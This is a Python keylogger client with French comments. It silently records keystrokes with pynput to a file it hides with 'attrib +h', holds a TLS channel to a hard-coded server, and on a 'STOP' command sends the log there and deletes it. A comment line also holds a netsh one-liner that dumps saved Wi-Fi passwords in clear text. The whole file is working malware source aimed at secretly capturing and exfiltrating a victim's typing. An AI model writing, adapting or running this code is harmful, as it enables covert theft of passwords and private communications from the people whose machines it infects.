import socket
import ssl
import os
from pynput.keyboard import Key, Listener
import logging
import platform
import threading

CA_CERTIFICATE = """
-----BEGIN CERTIFICATE-----
MIIFWzCCA0OgAwIBAgIUP+vhwJmtAa2r0XeZsgGeMNoADBAwDQYJKoZIhvcNAQEL
BQAwPTELMAkGA1UEBhMCRlIxCzAJBgNVBAgMAjc4MSEwHwYDVQQKDBhJbnRlcm5l
dCBXaWRnaXRzIFB0eSBMdGQwHhcNMjQwMjExMTM0MTI5WhcNMjUwMjEwMTM0MTI5
WjA9MQswCQYDVQQGEwJGUjELMAkGA1UECAwCNzgxITAfBgNVBAoMGEludGVybmV0
IFdpZGdpdHMgUHR5IEx0ZDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB
AJtpNKJSrwcHeaBsuNv9HfJwDr8s9CGraINL5DfYhQVJOIvrgNNUCbTjaa+I/TKX
UH1MbB6VVbn+JaCBroVw0RA6vkkFFwRhTqS+/fN25UFrKbwRQogpfsXhaSgx1AdN
YUJeddXe/NvClUUTVuSP18xZACjZ/pjtdZba//tJKWqWQlrWApa6aavVWujuo6fD
NDJ10idHWPtNp0vzz9msAbOGx7+w5Weg2IevbVrRhTi9o6mSy5RZa631bYw0WbwW
MA9JzUfpN8/P4ORNp+KMqaExpsZl9PKVVQeiDHEnkF6CW+mcZMs5OzpUBY3p+SSJ
3FWCocwCnmQyvo4ytG8PHSqB6kvihlXnYTd+Ihh38LVDvbj0K/oc2PzDIxazB3PU
SC0/5liQNTqUwpmzDgMF1UOnH29z3jTfDqDLB5bMA2BGCwzq5gI8G9v+8VjE7m3+
NMWG4P4qThweJ5a2PwzmOz3mYJ6u6dpWL6u7nbbOwG5dy1bkVvPEoCnP5G3o9QxL
nIC/Aj+Vg/FIseRSExSyvU+l/Y/6F69jYvlGw7WdLvc/78FHmE2lljWMisQIhs9P
n3btuVaBWgbElb1hjIObVnZe5rlEuxr5tihdTzBvCeS7gsm7gEzWbWI3dQuXSFuw
E/tKJ7rvxTHO4lxoXSEIFagMbJYVfTOsuERS6aM+u4sHAgMBAAGjUzBRMB0GA1Ud
DgQWBBQKv6qkJIdxCmniRA1IXbaRP8pUsjAfBgNVHSMEGDAWgBQKv6qkJIdxCmni
RA1IXbaRP8pUsjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4ICAQA5
13nI+CXoFWZ+SuYEw4EYI2qmwBJP/0V0aVXK5oYtZoo/oKXhqfcrTleo4RGGwO1M
O44iSaT5m28G+Wx6TutRl1UvdcKOOfDBoFUaLYME0wR4CJ8Y78urd38dpmDL/YP5
K02+5tybKuieOgO2ITjQ5cA1DeQpNst/zYtVN/SuRUp9kHZ3n6GXWj9k4cCB+kXQ
h3ilnMN2tOE4jhJ8IOcBGnbgQvLPmXVnV1gb/MrOtYIhBtY5Ys0i0Poi6chSH4yf
x4VsSIUR070rHl54gmKOugN+3FnJCG1mWtdFfBlrCoibnXnqMWt0sy2OIB1OYlF9
alS6tGjsSPnw9KKOsEBuCVlfvOVuhuDk9Hjv6p2RuxkSPwLxR9XFvq19wA56PUP5
r+2dkLHajpjyUedZckY6TOlJRO0ilV2bFaxwpl1YgowwirwhTjKvNS1Ud1Ourq4c
VLQEWTqdyA1zD6xVb9n4IZUwRvB3XtVi9JABQ7YGDIEBjB3jSk1j9SdN3ng2czHQ
7XpkxtZqklc+2r2hZElaoNsMOpsJ2NJB0Kj2JwPzjnRB8ypU9NptbV2OEKjGM/Di
b8OXOLq5J0idX09FxwPi2oDgKR15cquXYfqQRzdUsKtSBiJDY7rHelda/ojqTq5r
Mf4eDS43xP8LFcxhfn/1HioI9nV+Dsguyk0B++v9KQ==
-----END CERTIFICATE-----
"""

# for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
def check_platform():
    return platform.system()

def find_ca_cert_path():
    for r, d, f in os.walk("c:\\"): 
        for files in f:
            if files == "ca-cert.pem":
                path = os.path.join(r, files)
                if path.endswith("SSL\\CA\\ca-cert.pem"):
                    return path  
    return None 
    
def os_check():
        current_platform = check_platform()
        if current_platform == 'Windows':
            #print('Windows')
            return 'Windows'
        elif current_platform == 'Linux':
            #print('Linux')
            return 'Linux'   
        else:
            return None

def send_file(conn, filename):
    try:
        with open(filename, 'rb') as f:
            while True:
                chunk = f.read(1024)  # Lire un chunk du fichier
                print(f"chunk {chunk}")
                if not chunk:
                    break  # Si le chunk est vide, on a atteint la fin du fichier
                conn.sendall(chunk)  # Envoyer le chunk au client
    finally:
        # Fermer le fichier
        f.close()
        os.remove(filename)

def key_logger(path_hidden_file, client_ssl):
    logging.basicConfig(filename=path_hidden_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")
    os.system(f"attrib +h {path_hidden_file}")  # Rendre le fichier caché

    def on_press(key):
        logging.info(str(key))

    # Crée un écouteur de clavier pour enregistrer les touches
    with Listener(on_press=on_press) as listener:
        # Crée un thread pour écouter les messages du serveur
        server_listener_thread = threading.Thread(target=listen_to_server, args=(client_ssl,))
        server_listener_thread.start()

        # Attend que le thread du serveur se termine
        server_listener_thread.join()

        # Une fois le thread du serveur terminé, on arrête le keylogger
        listener.stop()
        exit(1)

def listen_to_server(client_ssl):
    while True:
        msg = client_ssl.recv(1024).decode()
        print(f"Server : {msg}")
        if msg == "STOP":
            print("stop")
            send_file(client_ssl, "its_a_trap.txt")
            exit(1)


def main():
    print('main active')
    os_local = os_check()
    print(os_local)
    if os_local == 'Windows':
        #print("Wait until the programme find the certificate file on your device ...")
        #ca_cert_path = find_ca_cert_path()
        #print(ca_cert_path)
        #script_dir = os.path.dirname(os.path.realpath(__file__))
        #ca_cert_path = os.path.abspath(os.path.join(script_dir, "..", "..","SSL", "CA", "ca-cert.pem"))
        # ca_cert_path = "C:/Users/rrais/Desktop/Dev/Python_Scripting/SSL/CA/ca-cert.pem" # take this path when you run it on .exe
        #print("CA cert path:", ca_cert_path)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.load_verify_locations(cadata=CA_CERTIFICATE)

        # Setting
        host = '192.168.1.43' #remplacer par l'ip du serveur
        port = 90
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Secure the socket
        client_ssl = context.wrap_socket(socket_obj, server_hostname=host)
        client_ssl.connect((host, port))
    #bien ou quoi
        while True:
            try:
                key_logger("its_a_trap.txt", client_ssl)
                    
                    #exit(1)
                    #print("-- END --")
                    #client_ssl.close()
                
            except Exception as e:
                print(f"Error: {e}")
                break

        print("-- END --")
        client_ssl.close()
    else : 
        print("linux in maintenance")

if __name__ == "__main__":
    main()
